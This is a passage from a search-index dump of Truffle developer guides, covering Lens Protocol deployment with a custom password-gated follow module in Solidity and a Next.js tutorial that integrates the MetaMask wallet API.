need to start a local test chain using Ganache to start interacting with this protocol. In addition to deploying each of our contracts, lines 207 to 245 in the migrations file whitelists our module smart contracts so that Lens can call into them. What's also interesting about this deployment is linking library contracts: console . log ( '\\n\\t-- Deploying Hub Implementation --' ); await LensHub . link ( hubLibs ); await deployer . deploy ( LensHub , followNFTImplAddress , collectNFTImplAddress , { nonce : deployerNonce ++ , gas : 25000000 }); let lensHubImpl = await LensHub . deployed (); You cannot deploy contracts that are greater than 24.77 kib in size. In order to get around this restriction, there are two things we do: Extracting functionality out into libraries Optimizing contract compilation in our truffle-config.js // Configure your compilers compilers : { solc : { version : \"0.8.10\" , // Fetch exact version from solc-bin (default: truffle's version) // docker: true, // Use \"0.5.1\" you've installed locally with docker (default: false) settings : { // See the solidity docs for advice about optimization and evmVersion optimizer : { enabled : true , runs : 200 }, // evmVersion: \"byzantium\" } } }, You can read more about optimizers here . In short, the optimizer attempts to simplify complex code, with the tradeoff being deployment cost against execution cost. If this is off, this contract will fail to deploy! The last piece that is interesting about this deployment is that we write all the relevant contract addresses to a file named addresses.json . This will be used later in our scripts when interacting with the Lens smart contracts.", "title": "truffle/migrations/1_deploy_lens_protocol.js"}, {"location": "guides/lens-protocol/#trufflescripts", "text": "This folder contains scripts that interact with the Lens protocol. In utils.js , we create some functions that help us easily retrieve common information. Note that getAddrs will read from the file we created in our migration script. Because it calls into the relative file path ./addresses.json , you have to execute scripts from the root truffle folder. Otherwise, the script will fail because it can't find ./addresses.json . You can only interact with it when it is unpaused, which you can do by calling truffle exec scripts/unpause.js after you've deployed the Lens contracts. Again, you'll note that we modify the from parameter in several contract calls. We send from the governance address when calling functions in LensHub contract that contains the onlyGov modifier await lensHub . whitelistCollectModule ( freeCollectModuleAddr , true , { from : governance }); 2. We send from a user address when calling functions that perform user interactions, such as making a post await lensHub . post ( inputStruct , { from : user });", "title": "truffle/scripts"}, {"location": "guides/lens-protocol/#truffleenv-and-truffletruffle-configjs", "text": "These two files define the networks that you can deploy the Lens contracts to. You can get the RPC URLs from your Infura account and use the mnemonic from your MetaMask wallet. Be sure to never expose this information!", "title": "truffle/.env and truffle/truffle-config.js"}, {"location": "guides/lens-protocol/#running-the-protocol", "text": "In order to deploy our contracts locally, you need to spin up a local instance of Ganache: ganache This will default to port 8545, which is designated as our development network in our truffle-config.js . Then, to deploy: truffle migrate If you want to deploy to other networks, you can run: truffle migrate --network <NETWORK_NAME> Because there are so many contracts, compilation will take some time. Do note that every time you run the migration, it will overwrite what contract addresses have been written to addresses.json .", "title": "Running the protocol"}, {"location": "guides/lens-protocol/#build-your-own-module", "text": "Now, we'll demonstrate how to create a custom module using the Truffle box. In this case, we'll only be working within the truffle folder. The completed code for the module lives here .", "title": "Build your own module"}, {"location": "guides/lens-protocol/#write-the-module-smart-contract", "text": "Let's customize the Lens follow functionality. Specifically, we want to specify that the user has to enter a password in order for them to follow a particular profile. Start off by creating a smart contract truffle/contracts/core/modules/follow/SecretCodeFollowModule.sol . Then, let's define our imports: pragma solidity 0.8.10 ; import { IFollowModule } from '../../../interfaces/IFollowModule.sol' ; import { ModuleBase } from '../ModuleBase.sol' ; import { FollowValidatorFollowModuleBase } from './FollowValidatorFollowModuleBase.sol' ; IFollowModule defines the functions Lens will hook into to customize the follow behavior. To explain the functions it defines: InitializeFollowModule() is called when a profile sets this module as its follow module. ProcessFollow() is called when a user attempts to follow a given profile with this module set as its follow module. FollowModuleTransferHook() is called when a FollowNFT associated with a profile that has this module set as its follow module is transferred ValidateFollow() which` is called to validate whether a follow is still valid ModuleBase exposes an onlyHub modifier and HUB address. FollowValidatorFollowModuleBase implements `isFollowing, which is one of the functions we need to define in the interface Now, let's create a contract that inherits these imports: contract SecretCodeFollowModule is IFollowModule , FollowValidatorFollowModuleBase { } Then, let's define some variables we'll need. We'll create a custom error that indicates the wrong passcode was input and a mapping that associates passwords with profiles. error PasscodeInvalid (); mapping ( uint256 => uint256 ) internal _passcodeByProfile ; Then, add SecretCodeFollowModule 's constructor, which inherits from ModuleBase . constructor ( address hub ) ModuleBase ( hub ) {} Finally, we'll implement the interface functions: function initializeFollowModule ( uint256 profileId , bytes calldata data ) external override onlyHub returns ( bytes memory ) { uint256 passcode = abi . decode ( data , ( uint256 )); _passcodeByProfile [ profileId ] = passcode ; return data ; } function processFollow ( address follower , uint256 profileId , bytes calldata data ) external view override { uint256 passcode = abi . decode ( data , ( uint256 )); if ( passcode != _passcodeByProfile [ profileId ]) revert PasscodeInvalid (); } function followModuleTransferHook ( uint256 profileId , address from , address to , uint256 followNFTTokenId ) external override {} Note that we don't implement anything in followModuleTransferHook because we don't need to use it! Your final smart contract code should look like this: pragma solidity 0.8.10 ; import { IFollowModule } from '../../../interfaces/IFollowModule.sol' ; import { ModuleBase } from '../ModuleBase.sol' ; import { FollowValidatorFollowModuleBase } from './FollowValidatorFollowModuleBase.sol' ; contract SecretCodeFollowModule is IFollowModule , FollowValidatorFollowModuleBase { error PasscodeInvalid (); mapping ( uint256 => uint256 ) internal _passcodeByProfile ; constructor ( address hub ) ModuleBase ( hub ) {} function initializeFollowModule ( uint256 profileId , bytes calldata data ) external override onlyHub returns ( bytes memory ) { uint256 passcode = abi . decode ( data , ( uint256 )); _passcodeByProfile [ profileId ] = passcode ; return data ; } function processFollow ( address follower , uint256 profileId , bytes calldata data ) external view override { uint256 passcode = abi . decode ( data , ( uint256 )); if ( passcode != _passcodeByProfile [ profileId ]) revert PasscodeInvalid (); } function followModuleTransferHook ( uint256 profileId , address from , address to , uint256 followNFTTokenId ) external override {} }", "title": "Write the module smart contract"}, {"location": "guides/lens-protocol/#deploy-your-new-contract", "text": "Let's create a new file truffle/migrations/2_deploy_SecretCodeFollowModule.js . As in our previous migration file, we have to define our LensHub contract based on the proxy address. Then, in order for us to use the new module, we have to whitelist it, calling the function from the governanceAddress . const SecretCodeFollowModule = artifacts . require ( \"SecretCodeFollowModule\" ); const TransparentUpgradeableProxy = artifacts . require ( \"TransparentUpgradeableProxy\" ); const LensHub = artifacts . require ( \"LensHub\" ); module . exports = async function ( deployer , networks , accounts ) { const governanceAddress = accounts [ 1 ]; const proxy = await TransparentUpgradeableProxy . deployed (); const lensHub = await LensHub . at ( proxy . address ); await deployer . deploy ( SecretCodeFollowModule , lensHub . address ) const secretCodeFollowModule = await SecretCodeFollowModule . deployed (); await lensHub . whitelistFollowModule ( secretCodeFollowModule . address , true , { from : governanceAddress }); } Since we don't want to rerun the first migration, you can use the --f flag to specify exactly which migration file you want to execute: truffle migrate --f 2", "title": "Deploy your new contract!"}, {"location": "guides/lens-protocol/#write-a-script-to-test-the-new-module", "text": "Now, let's write a script that will call on the new follow functionality. Create a file truffle/scripts/secret_follow.js , and add this code: const { defaultAbiCoder } = require ( 'ethers/lib/utils' ); const { getAddrs , initEnv , ProtocolState , ZERO_ADDRESS , } = require ( './helpers/utils' ); const LensHub = artifacts . require ( \"LensHub\" ); const FollowNFT = artifacts . require ( \"FollowNFT\" ); const SecretCodeFollowModule = artifacts . require ( \"SecretCodeFollowModule\" ); const main = async ( cb ) => { try { const [ governance , , user ] = await initEnv ( web3 ); const addrs = getAddrs (); const lensHub = await LensHub . at ( addrs [ 'lensHub proxy' ]); await lensHub . setState ( ProtocolState . Unpaused , { from : governance }); await lensHub . whitelistProfileCreator ( user , true , { from : governance }); // Will fail if you've already minted this profile // const inputStruct = { // to: user, // handle: 'zer0dot', // imageURI: // 'https://ipfs.fleek.co/ipfs/ghostplantghostplantghostplantghostplantghostplantghostplan', // followModule: ZERO_ADDRESS, // followModuleInitData: [], // followNFTURI: // 'https://ipfs.fleek.co/ipfs/ghostplantghostplantghostplantghostplantghostplantghostplan', // }; // await lensHub.createProfile(inputStruct, {from: user}); const data = defaultAbiCoder . encode ([ 'uint256' ], [ '42069' ]); const secretCodeFollowModule = await SecretCodeFollowModule . deployed (); await lensHub . setFollowModule ( 1 , secretCodeFollowModule . address , data , { from : user }); try { await lensHub . follow ([ 1 ], [ badData ], { from : user , gas : \"0xfffff\" }); } catch ( e ) { console . log ( `Expected failure occurred! Error: ${ e } ` ); } await lensHub . follow ([ 1 ], [ data ], { from : user }); const followNFTAddr = await lensHub . getFollowNFT ( 1 , { from : governance }); const followNFT = await FollowNFT . at ( followNFTAddr ); const totalSupply = await followNFT . totalSupply ({ from : user }); const ownerOf = await followNFT . ownerOf ( 1 , { from : user }); console . log ( `Follow NFT total supply (should be 1): ${ totalSupply } ` ); console . log ( `Follow NFT owner of ID 1: ${ ownerOf } , user address (should be the same): ${ user } ` ); } catch ( err ) { console . log ( err ); } cb (); } module . exports = main ; Replace [SecretFollowModuleAddress] in line 36 with the contract address. You can easily find it by running truffle networks . If you haven't executed the create-profile script yet, you can uncomment the profile creation piece of this code. Otherwise, if you have created a profile, leave that portion commented, since you cannot create two profiles with the same username. To run, simply call: truffle exec scripts/secret_follow.js You should see something a bit like this: Using network 'development' . Expected failure occurred! Error: StatusError: Transaction: 0x1c22b1e9b35d6531b22e22d807d58be55c96a81e343bf2bb3f5bd35145a1b255 exited with an error ( status 0 ) . Reason given: Custom error ( could not decode ) . Please check that the transaction: - satisfies all conditions set by Solidity ` require ` statements. - does not trigger a Solidity ` revert ` statement. Follow NFT total supply ( should be 1 ) : 1 Follow NFT owner of ID 1 : 0xA9A3b27098f4446a1019F75e1164F4ca1980727e, user address ( should be the same ) : 0xA9A3b27098f4446a1019F75e1164F4ca1980727e The first failure is expected because we intentionally input the wrong password!", "title": "Write a script to test the new module"}, {"location": "guides/lens-protocol/#future-extensions", "text": "So there you have it! We've gone over how to incorporate the Lens API into your dapp frontends and how to customize the Lens functionality by modifying their smart contracts using modules. There are a variety of ways to extend this content, such as creating a more fully fleshed dapp like Twitter or gating Lens actions through NFT ownership. Let us know how you utilized the Lens box by joining our community! If you want to talk about this content, join our Discord ! If you need help coding, start a discussion here . Lastly, don't forget to follow us on Twitter for the latest updates on all things Truffle.", "title": "Future extensions"}, {"location": "guides/livepeer-decentralized-streaming/", "text": "Web3 Unleashed: What is Decentralized Streaming? \u00b6 Written by Emily Lin Last updated 9/22/2022 Overview \u00b6 In this edition of Web3 Unleashed, we're interviewing Livepeer co-founder Yondon Fu about the past, present, and future of decentralized streaming. We'll actually be using Livepeer to stream this to our website live! Watch on YouTube here . Sign up for reminders for Web3 Unleashed here . If you want to talk about this content, make suggestions for what you'd like to see or ask questions about the series, join our Discord ! Lastly, don't forget to follow us on Twitter for the latest updates on all things Truffle.", "title": "Web3 Unleashed: What is Decentralized Streaming?"}, {"location": "guides/livepeer-decentralized-streaming/#web3-unleashed-what-is-decentralized-streaming", "text": "Written by Emily Lin Last updated 9/22/2022", "title": "Web3 Unleashed: What is Decentralized Streaming?"}, {"location": "guides/livepeer-decentralized-streaming/#overview", "text": "In this edition of Web3 Unleashed, we're interviewing Livepeer co-founder Yondon Fu about the past, present, and future of decentralized streaming. We'll actually be using Livepeer to stream this to our website live! Watch on YouTube here . Sign up for reminders for Web3 Unleashed here . If you want to talk about this content, make suggestions for what you'd like to see or ask questions about the series, join our Discord ! Lastly, don't forget to follow us on Twitter for the latest updates on all things Truffle.", "title": "Overview"}, {"location": "guides/metamask-api/", "text": "Web3 Unleashed: Build a dapp with Next.js and the MetaMask API \u00b6 Written by Eric Bishard Last updated 10/12/2022 Overview \u00b6 In this edition of Web3 Unleashed , we're interviewing the MetaMask DevRel team Gui Bibeau and Eric Bishard about the MetaMask API and other tools and features on the horizon like their MetaMask SDK. We will be building a dapp live with them to custom integrate MetaMask into a NextJS application! If you would like to follow along with the Web3 Unleashed Episode #7 demo during or after the stream, below are the steps we walked through to build our dapp integration with MetaMask API. Prerequisites \u00b6 MetaMask Extension NodeJS NPM Git Clone and Install Dependencies \u00b6 Clone the MetaMask API Web3 Unleashed repo . Then, to get your project started, change into the directory and install the dependencies: git clone https://github.com/metamask/nextjs-starter.git cd nextjs-starter npm i && npm run dev This will give us a starting point in a NextJS application to build our demo. Connecting the User \u00b6 We will start by updating the hooks/useMetamask.tsx file. This is our global app context that utilizes \"out of the box\" Context API in React. Update hooks/useMetamask.tsx file: import React , { useEffect , type PropsWithChildren } from \"react\" ; type ConnectAction = { type : \"connect\" ; wallet : string }; type DisconnectAction = { type : \"disconnect\" }; type PageLoadedAction = { type : \"pageLoaded\" ; isMetamaskInstalled : boolean }; type LoadingAction = { type : \"loading\" }; type Action = | ConnectAction | DisconnectAction | PageLoadedAction | LoadingAction ; type Dispatch = ( action : Action ) => void ; type Status = \"loading\" | \"idle\" | \"pageNotLoaded\" ; type State = { wallet : string | null ; isMetamaskInstalled : boolean ; status : Status ; }; const MetamaskContext = React . createContext < { state : State ; dispatch : Dispatch } | undefined > ( undefined ); const initialState : State = { wallet : null , isMetamaskInstalled : false , status : \"loading\" , } as const ; function metamaskReducer ( state : State , action : Action ) : State { switch ( action . type ) { case \"connect\" : { const { wallet } = action ; return { ... state , wallet , status : \"idle\" }; } case \"disconnect\" : { return { ... state , wallet : null }; } case \"pageLoaded\" : { const { isMetamaskInstalled } = action ; return { ... state , isMetamaskInstalled , status : \"idle\" }; } case \"loading\" : { return { ... state , status : \"loading\" }; } default : { throw new Error ( \"Unhandled action type\" ); } } } function MetamaskProvider ({ children } : PropsWithChildren ) { const [ state , dispatch ] = React . useReducer ( metamaskReducer , initialState ); const value = { state , dispatch }; useEffect (() => { if ( typeof window !== undefined ) { // start by checking if window.ethereum is present, indicating a wallet extension const ethereumProviderInjected = typeof window . ethereum !== \"undefined\" ; // this could be other wallets so we can verify if we are dealing with metamask // using the boolean constructor to be explicit and not let this be used as a falsy value (optional) const isMetamaskInstalled = ethereumProviderInjected && Boolean ( window . ethereum . isMetaMask ); dispatch ({ type : \"pageLoaded\" , isMetamaskInstalled }); } }, []); return ( < MetamaskContext . Provider value = { value } > { children } < /MetamaskContext.Provider> ); } function useMetamask () { const context = React . useContext ( MetamaskContext ); if ( context === undefined ) { throw new Error ( \"useMetamask must be used within a MetamaskProvider\" ); } return context ; } export { MetamaskProvider , useMetamask }; The above change is by far one of our largest changes that we will do at one time but this file is in charge of helping us keep our application state in sync with the wallet state and is crucial so that we can build the components and features that we want. After this change you will might notice red squiggly lines under the window.ethereum object, this is only because if we want TypeScript to stop yelling at us in our code editor, we need to tell it what window.ethereum is type-wise. Add the file types.d.ts to the app root: type InjectedProviders = { isMetaMask? : true ; }; interface Window { ethereum : InjectedProviders & { on : ( ...args : any []) => void ; removeListener ?: ( ...args : any []) => void ; request < T = any > ( args : any ) : Promise < T > ; }; } You should no longer see those warnings in your hooks/useMetamask.tsx file. Create a components/Loading.tsx file: import { type FC } from \"react\" ; const dot = `rounded-full h-2 w-2 mx-0.5 bg-current animate-[blink_1s_ease_0s_infinite_normal_both]\"` ; let style = { animationDelay : \"0.2s\" }; export const Loading : FC = () => { return ( < span className = \"inline-flex text-center items-center leading-7 h-6\" > < span className = { dot } key = \"dot_1\" /> < span className = { dot } style = { style } key = \"dot_2\" /> < span className = { dot } style = { style } key = \"dot_3\" /> < /span> ); }; With our type definitions added, our MetamaskContext Provider updated, and our Loading.tsx in place, we can now make changes to our components/Wallet.tsx file and add a loading state for our app. Update the components/Wallet.tsx file to: import Image from \"next/future/image\" ; import Link from \"next/link\" ; import { useMetamask } from \"../hooks/useMetamask\" ; import { Loading } from \"./Loading\" ; export default function Wallet () { const { dispatch , state : { status , isMetamaskInstalled }, } = useMetamask (); const showInstallMetamask = status !== \"pageNotLoaded\" && ! isMetamaskInstalled ; const showConnectButton = status !== \"pageNotLoaded\" && isMetamaskInstalled ; const handleConnect = async () => { dispatch ({ type : \"loading\" }); const accounts = await window . ethereum . request ({ method : \"eth_requestAccounts\" , }); if ( accounts . length > 0 ) { dispatch ({ type : \"connect\" , wallet : accounts [ 0 ] }); } }; return ( < div className = \"bg-truffle\" > < div className = \"mx-auto max-w-2xl py-16 px-4 text-center sm:py-20 sm:px-6 lg:px-8\" > < h2 className = \"text-3xl font-bold tracking-tight text-white sm:text-4xl\" > < span className = \"block\" > Metamask API intro < /span> < /h2> < p className = \"mt-4 text-lg leading-6 text-white\" > Follow along with the { \" \" } < Link href = \"https://github.com/GuiBibeau/web3-unleashed-demo\" target = \"_blank\" > < span className = \"underline cursor-pointer\" > Repo < /span> < /Link>{\" \"} in order to learn how to use the Metamask API . < /p> { showConnectButton && ( < button onClick = { handleConnect } className = \"mt-8 inline-flex w-full items-center justify-center rounded-md border border-transparent bg-ganache text-white px-5 py-3 text-base font-medium sm:w-auto\" > { status === \"loading\" ? < Loading /> : \"Connect Wallet\" } < /button> )} { showInstallMetamask && ( < Link href = \"https://metamask.io/\" target = \"_blank\" > < a className = \"mt-8 inline-flex w-full items-center justify-center rounded-md border border-transparent bg-ganache text-white px-5 py-3 text-base font-medium sm:w-auto\" > Connect Wallet < /a> < /Link> )} < /div> < /div> ); } This imports the loading component, further destructures the return value of our useMetaMask() custom hook, sets up variables to track if MetaMask is installed or connected for conditional rendering, and gives us a handleConnect() function for dispatching changes to our state reducer. If we are tracking our changes we can see that we have touched 4 files by creating or updating/refactoring. At this point we should be able to connect a user to our dapp with MetaMask. Run the project and attempt to connect to your MetaMask wallet. npm run dev Two things are happening now: If a user does not have MetaMask installed they will get a \"Connect Wallet\" button that simply takes you to download MetaMask. If MetaMask is installed they will see a \"Connect Wallet\" button that actually connects their wallet to the dapp. We are not yet hiding the button once connected or displaying any wallet information. As well, you will notice in MetaMask that you are connected to the dapp. To test the Install link you can go into your extension manager and disable MetaMask temporarily. Checkout the Diff to see what changed Use the MetaMask API to get User Info \u00b6 We want to display the balance from our wallet, and the public address of the wallet account that is connected to our dapp. For this we need to make a few changes again to the hooks/useMetamask.tsx and add the logic and JSX/HTML in our components/Wallet.tsx . Update hooks/useMetamask.tsx to: import React , { useEffect , type PropsWithChildren } from \"react\" ; type ConnectAction = { type : \"connect\" ; wallet : string ; balance : string }; type DisconnectAction = { type : \"disconnect\" }; type PageLoadedAction = { type : \"pageLoaded\" ; isMetamaskInstalled : boolean }; type LoadingAction = { type : \"loading\" }; type Action = | ConnectAction | DisconnectAction | PageLoadedAction | LoadingAction ; type Dispatch = ( action : Action ) => void ; type Status = \"loading\" | \"idle\" | \"pageNotLoaded\" ; type State = { wallet : string | null ; isMetamaskInstalled : boolean ; status : Status ; balance : string | null ; }; const initialState : State = { wallet : null , isMetamaskInstalled : false , status : \"loading\" , balance : null , } as const ; function metamaskReducer ( state : State , action : Action ) : State { switch ( action . type ) { case \"connect\" : { const { wallet , balance } = action ; return { ... state , wallet , balance , status : \"idle\" }; } case \"disconnect\" : { return { ... state , wallet : null }; } case \"pageLoaded\" : { const { isMetamaskInstalled } = action ; return { ... state , isMetamaskInstalled , status : \"idle\" }; } case \"loading\" : { return { ... state , status : \"loading\" }; } default : { throw new Error ( \"Unhandled action type\" ); } } } const MetamaskContext = React . createContext < { state : State ; dispatch : Dispatch } | undefined > ( undefined ); function MetamaskProvider ({ children } : PropsWithChildren ) { const [ state , dispatch ] = React . useReducer ( metamaskReducer , initialState ); const value = { state , dispatch }; useEffect (() => { if ( typeof window !== undefined ) { // start by checking if window.ethereum is present, indicating a wallet extension const ethereumProviderInjected = typeof window . ethereum !== \"undefined\" ; // this could be other wallets so we can verify if we are dealing with metamask // using the boolean constructor to be explecit and not let this be used as a falsy value (optional) const isMetamaskInstalled = ethereumProviderInjected && Boolean ( window . ethereum . isMetaMask ); dispatch ({ type : \"pageLoaded\" , isMetamaskInstalled }); } }, []); return ( < MetamaskContext . Provider value = { value } > { children } < /MetamaskContext.Provider> ); } function useMetamask () { const context = React . useContext ( MetamaskContext ); if ( context === undefined ) { throw new Error ( \"useMetamask must be used within a MetamaskProvider\" ); } return context ; } export { MetamaskProvider , useMetamask }; We have done some slight refactoring to account for the ability to track the state of the wallet balance, added balance to our initialState , and updated our connect action in our reducer Update components/Wallet.tsx to: import Image from \"next/future/image\" ; import Link from \"next/link\" ; import { useMetamask } from \"../hooks/useMetamask\" ; import { Loading } from \"./Loading\" ; export default function Wallet () { const { dispatch , state : { status , isMetamaskInstalled , wallet , balance }, } = useMetamask (); const showInstallMetamask = status !== \"pageNotLoaded\" && ! isMetamaskInstalled ; const showConnectButton = status !== \"pageNotLoaded\" && isMetamaskInstalled && ! wallet ; const handleConnect = async () => { dispatch ({ type : \"loading\" }); const accounts = await window . ethereum . request ({ method : \"eth_requestAccounts\" , }); if ( accounts . length > 0 ) { const balance = await window . ethereum ! . request ({ method : \"eth_getBalance\" , params : [ accounts [ 0 ], \"latest\" ], }); dispatch ({ type : \"connect\" , wallet : accounts [ 0 ], balance }); } }; return ( < div className = \"bg-truffle\" > < div className = \"mx-auto max-w-2xl py-16 px-4 text-center sm:py-20 sm:px-6 lg:px-8\" > < h2 className = \"text-3xl font-bold tracking-tight text-white sm:text-4xl\" > < span className = \"block\" > Metamask API intro < /span> < /h2> < p className = \"mt-4 text-lg leading-6 text-white\" > Follow along with the { \" \" } < Link href = \"https://github.com/GuiBibeau/web3-unleashed-demo\" target = \"_blank\" > < span className = \"underline cursor-pointer\" > Repo < /span> < /Link>{\" \"} in order to learn how to use the Metamask API . < /p> { wallet && ( < div className = \" px-4 py-5 sm:px-6\" > < div className = \"-ml-4 -mt-4 flex flex-wrap items-center justify-between sm:flex-nowrap\" > < div className = \"ml-4 mt-4\" > < div className = \"flex items-center\" > < div className = \"ml-4\" > < h3 className = \"text-lg font-medium leading-6 text-white\" > Address : < span > { wallet } < /span> < /h3> < p className = \"text-sm text-white\" > Balance : < span > { balance } < /span> < /p> < /div> < /div> < /div> < /div> < /div> )} { showConnectButton && ( < button onClick = { handleConnect } className = \"mt-8 inline-flex w-full items-center justify-center rounded-md border border-transparent bg-ganache text-white px-5 py-3 text-base font-medium sm:w-auto\" > { status === \"loading\" ? < Loading /> : \"Connect Wallet\" } < /button> )} { showInstallMetamask && ( < Link href = \"https://metamask.io/\" target = \"_blank\" > < a className = \"mt-8 inline-flex w-full items-center justify-center rounded-md border border-transparent bg-ganache text-white px-5 py-3 text-base font-medium sm:w-auto\" > Connect Wallet < /a> < /Link> )} < /div> < /div> ); } We have also added balance to our destructured object so that we have access to it in our component, updated the showConnectButton logic, and requested the balance using the eth_getBalance method. We have also updated our JSX/HTML to include an address and balance . This is a great start, but our UI is still lacking and there is more logic we need to properly track our wallet state and update the page because if we connect to our wallet we get a funny display for our balance and if we refresh our page, we don't see our address and balance. But we will now fix those issues. Checkout the Diff to see what changed Two Way Communication with MetaMask \u00b6 Again, we will be updating the hooks/useMetamask.tsx and components/Wallet.tsx files. The idea will be to add a few more reducer actions including Loading and Idle states for the page, we will fix our button to say \"Install MetaMask\" instead of \"Connect MetaMask\" , and we will parse the balance to display a readable number. Finally, we will add some code that uses the wallet_watchAsset MetaMask (RPC API) method to add $USDC token to our MetaMask wallet. This will enable our users to see those tokens in their wallet if they have them. If a dApp uses a particular token, we can programmatically do this for them rather than expecting to do it themselves manually through the MetaMask UI. Update hooks/useMetamask.tsx to: import React , { useEffect , type PropsWithChildren } from \"react\" ; type ConnectAction = { type : \"connect\" ; wallet : string ; balance : string }; type DisconnectAction = { type : \"disconnect\" }; type PageLoadedAction = { type : \"pageLoaded\" ; isMetamaskInstalled : boolean }; type LoadingAction = { type : \"loading\" }; type IdleAction = { type : \"idle\" }; type Action = | ConnectAction | DisconnectAction | PageLoadedAction | LoadingAction | IdleAction ; type Dispatch = ( action : Action ) => void ; type Status = \"loading\" | \"idle\" | \"pageNotLoaded\" ; type State = { wallet : string | null ; isMetamaskInstalled : boolean ; status : Status ; balance : string | null ; }; const initialState : State = { wallet : null , isMetamaskInstalled : false , status : \"loading\" , balance : null , } as const ; function metamaskReducer ( state : State , action : Action ) : State { switch ( action . type ) { case \"connect\" : { const { wallet , balance } = action ; return { ... state , wallet , balance , status : \"idle\" }; } case \"disconnect\" : { return { ... state , wallet : null , balance : null }; } case \"pageLoaded\" : { const { isMetamaskInstalled } = action ; return { ... state , isMetamaskInstalled , status : \"idle\" }; } case \"loading\" : { return { ... state , status : \"loading\" }; } case \"idle\" : { return { ... state , status : \"idle\" }; } default : { throw new Error ( \"Unhandled action type\" ); } } } const MetamaskContext = React . createContext < { state : State ; dispatch : Dispatch } | undefined > ( undefined ); function MetamaskProvider ({ children } : PropsWithChildren ) { const [ state , dispatch ] = React . useReducer ( metamaskReducer , initialState ); const value = { state , dispatch }; useEffect (() => { if ( typeof window !== undefined ) { // start by checking if window.ethereum is present, indicating a wallet extension const ethereumProviderInjected = typeof window . ethereum !== \"undefined\" ; // this could be other wallets so we can verify if we are dealing with metamask // using the boolean constructor to be explecit and not let this be used as a falsy value (optional) const isMetamaskInstalled = ethereumProviderInjected && Boolean ( window . ethereum . isMetaMask ); dispatch ({ type : \"pageLoaded\" , isMetamaskInstalled }); } }, []); return ( < MetamaskContext . Provider value = { value } > { children } < /MetamaskContext.Provider> ); } function useMetamask () { const context = React . useContext ( MetamaskContext ); if ( context === undefined ) { throw new Error ( \"useMetamask must be used within a MetamaskProvider\" ); } return context ; } export { MetamaskProvider , useMetamask }; Update components/Wallet.tsx to: import Link from \"next/link\" ; import { useMetamask } from \"../hooks/useMetamask\" ; import { Loading } from \"./Loading\" ; export default function Wallet () { const { dispatch , state : { status , isMetamaskInstalled , wallet , balance }, } = useMetamask (); const showInstallMetamask = status !== \"pageNotLoaded\" && ! isMetamaskInstalled ; const showConnectButton = status !== \"pageNotLoaded\" && isMetamaskInstalled && ! wallet ; const showAddToken = status !== \"pageNotLoaded\" && typeof wallet === \"string\" ; const handleConnect = async () => { dispatch ({ type : \"loading\" }); const accounts = await window . ethereum . request ({ method : \"eth_requestAccounts\" , }); if ( accounts . length > 0 ) { const balance = await window . ethereum ! . request ({ method : \"eth_getBalance\" , params : [ accounts [ 0 ], \"latest\" ], }); dispatch ({ type : \"connect\" , wallet : accounts [ 0 ], balance }); // we can register an event listener for changes to the users wallet window . ethereum . on ( \"accountsChanged\" , async ( newAccounts : string []) => { if ( newAccounts . length > 0 ) { // uppon receiving a new wallet, we'll request again the balance to synchronize the UI. const newBalance = await window . ethereum ! . request ({ method : \"eth_getBalance\" , params : [ newAccounts [ 0 ], \"latest\" ], }); dispatch ({ type : \"connect\" , wallet : newAccounts [ 0 ], balance : newBalance , }); } else { // if the length is 0, then the user has disconnected from the wallet UI dispatch ({ type : \"disconnect\" }); } }); } }; const handleAddUsdc = async () => { dispatch ({ type : \"loading\" }); await window . ethereum . request ({ method : \"wallet_watchAsset\" , params : { type : \"ERC20\" , options : { address : \"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48\" , symbol : \"USDC\" , decimals : 18 , image : \"https://cryptologos.cc/logos/usd-coin-usdc-logo.svg?v=023\" , }, }, }); dispatch ({ type : \"idle\" }); }; return ( < div className = \"bg-truffle\" > < div className = \"mx-auto max-w-2xl py-16 px-4 text-center sm:py-20 sm:px-6 lg:px-8\" > < h2 className = \"text-3xl font-bold tracking-tight text-white sm:text-4xl\" > < span className = \"block\" > Metamask API intro < /span> < /h2> < p className = \"mt-4 text-lg leading-6 text-white\" > Follow along with the { \" \" } < Link href = \"https://github.com/GuiBibeau/web3-unleashed-demo\" target = \"_blank\" > < span className = \"underline cursor-pointer\" > Repo < /span> < /Link>{\" \"} in order to learn how to use the Metamask API . < /p> { wallet && balance && ( < div className = \" px-4 py-5 sm:px-6\" > < div className = \"-ml-4 -mt-4 flex flex-wrap items-center justify-between sm:flex-nowrap\" > < div className = \"ml-4 mt-4\" > < div className = \"flex items-center\" > < div className = \"ml-4\" > < h3 className = \"text-lg font-medium leading-6 text-white\" > Address : < span > { wallet } < /span> < /h3> < p className = \"text-sm text-white\" > Balance : { \" \" } < span > {( parseInt ( balance ) / 1000000000000000000 ). toFixed ( 4 )}{ \" \" } ETH < /span> < /p> < /div> < /div> < /div> < /div> < /div> )} { showConnectButton && ( < button onClick = { handleConnect } className = \"mt-8 inline-flex w-full items-center justify-center rounded-md border border-transparent bg-ganache text-white px-5 py-3 text-base font-medium sm:w-auto\" > { status === \"loading\" ? < Loading /> : \"Connect Wallet\" } < /button> )} { showInstallMetamask && ( < Link href = \"https://metamask.io/\" target = \"_blank\" > < a className = \"mt-8 inline-flex w-full items-center justify-center rounded-md border border-transparent bg-ganache text-white px-5 py-3 text-base font-medium sm:w-auto\" > Install Metamask < /a> < /Link> )} { showAddToken && ( < button onClick = { handleAddUsdc } className = \"mt-8 inline-flex w-full items-center justify-center rounded-md border border-transparent bg-ganache text-white px-5 py-3 text-base font-medium sm:w-auto\" > { status === \"loading\" ? < Loading /> : \"Add Token\" } < /button> )} < /div> < /div> ); } With those changes in place we can now install, connect to, and view information from our MetaMask wallet. We can also see a nicely formatted version of our ETH balance and we can see $USDC tokens in our wallet. Checkout the Diff to see what changed We have one more UX improvement to push to our dapp. More UX Goodies \u00b6 We'd like to store some MetaMask state in the browser's local storage to help us create a Disconnect button, something that we feel makes the UX better in a dapp. We will register an event listener for changes to the user's wallet, so that when connecting and disconnecting the UX is just a little bit better. We will add a custom React Hook called useListen to help us achieve this and to co-locate some code that would otherwise be added in two different components so that our final code is a bit cleaner. We do a small refactor to get rid of a useEffect and we will display our buttons side by side when we have more than one showing on the page (Disconnect & Add Tokens) and we will use Tailwind's flex-box options to make this easy. Update hooks/useMetamask.tsx import React , { useEffect , type PropsWithChildren } from \"react\" ; type ConnectAction = { type : \"connect\" ; wallet : string ; balance : string }; type DisconnectAction = { type : \"disconnect\" }; type PageLoadedAction = { type : \"pageLoaded\" ; isMetamaskInstalled : boolean ; wallet : string | null ; balance : string | null ; }; type LoadingAction = { type : \"loading\" }; type IdleAction = { type : \"idle\" }; type Action = | ConnectAction | DisconnectAction | PageLoadedAction | 